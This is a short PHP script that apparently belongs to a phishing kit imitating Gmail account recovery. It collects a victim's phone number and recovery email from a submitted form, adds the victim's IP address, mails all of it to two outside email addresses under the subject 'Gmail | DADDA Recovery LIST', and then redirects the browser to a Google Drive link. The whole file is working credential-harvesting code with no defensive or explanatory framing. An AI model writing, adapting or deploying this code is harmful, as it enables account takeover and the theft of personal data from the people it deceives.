<?php

	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();
	$phoneNumber = $_POST["phoneNumber"];
    $recemail = $_POST["recEmail"];

$IP = getenv("REMOTE_ADDR");

$BS =   $_SERVER['HTTP_USER_AGENT'];

    $message = "Gmail FROM GOD recovery details". "\n"; 
    $message .= "phone: " . $phoneNumber . "\n"; 
    $message .= "recovery email " .$_POST["recEmail"] . "\n"; 
    $message .= "IP: ".$IP."\n";

    $to = "jaentpa@aol.com, julyfuttttttttttt@outlook.com"; 
    
    $subject = "Gmail | DADDA Recovery LIST";
	$headers = "From: NEW ERA <toolz@ddamgo.lite>";
	
	$send = mail($to,$subject,$message,$headers);
	if($send){

?>
	<script>
		window.location="https://drive.google.com/file/d/0BztQL0ySpi4pRU5tSktJS0lTYzA/view";
	</script>
<?php } ?>
